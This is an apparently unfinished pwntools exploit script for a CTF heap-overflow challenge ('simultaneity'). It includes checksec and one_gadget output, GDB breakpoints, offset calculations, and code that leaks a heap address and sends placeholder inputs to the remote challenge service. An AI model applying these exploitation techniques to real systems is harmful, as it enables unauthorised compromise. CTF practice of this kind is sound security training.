from pwn import *
import re

# useful - https://bitvijays.github.io/LFC-BinaryExploitation.html
# https://wiki.x10sec.org/pwn/linux/glibc-heap/leak_heap/
# https://github.com/shellphish/how2heap
# https://github.com/scwuaptx/Pwngdb
# https://guyinatuxedo.github.io/25-heap/index.html
# https://trailofbits.github.io/ctf/

### INITIAL EXPLORATION ###

# $ checksec
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

# $ one_gadget libc.so.6
# 0x4484f, 0x448a3, 0xe5456

# Ghidra
# Some kind of heap overflow, we can write size of malloc and how much after malloc to write to.
# 
# how big => %ld 
# how far => %ld
# what => %zu accepts numerals only

# GDB
# break *main+0x60 before malloc
# break *main+0x7c
# break *main+0xd3 before scanf call
# break *main+0xd8 last instruction before exit

# p 0x00007fffffffddb8 - 0x5555555596b0
# offset to stack 0x2aaaaaaa4708 = 46912496092936 -- divide by 8 = 5864062011617
# set *(int *)0x00007fffffffdd98 = 0x2aaaaaaa4708

# 0x7ffca2c5c2e0 - 0x562a6e0832b0
# 0x7ffdc72588c0 - 0x564c29d802b0
###########################

HOST, PORT = "mc.ax", 31547
BINARY = './simultaneity'
# context.log_level = 'critical'

elf = ELF(BINARY)
libc = ELF('./libc.so.6')

def start():
    if not args.REMOTE:
        print("LOCAL PROCESS")
        return process(BINARY)
    else:
        print("REMOTE PROCESS")
        return remote(HOST, PORT)

def solve():
    p = start()

    gdb.attach(p, '''
    # before scanf call
    break *main+0xd3 
    # last instruction before exit
    break *main+0xd8
    continue
    ''')

    p.sendlineafter('how big?', '2')

    # Get malloc-ed address
    p.recvline()
    leak = p.recvline().decode()
    malloc_addr = int(leak[-15:], 0)
    log.info('malloc-ed address: ' + (hex(malloc_addr)))

    p.sendlineafter('how far?', '2')

    p.sendlineafter('what?', '1111111111111')

    p.interactive()

solve()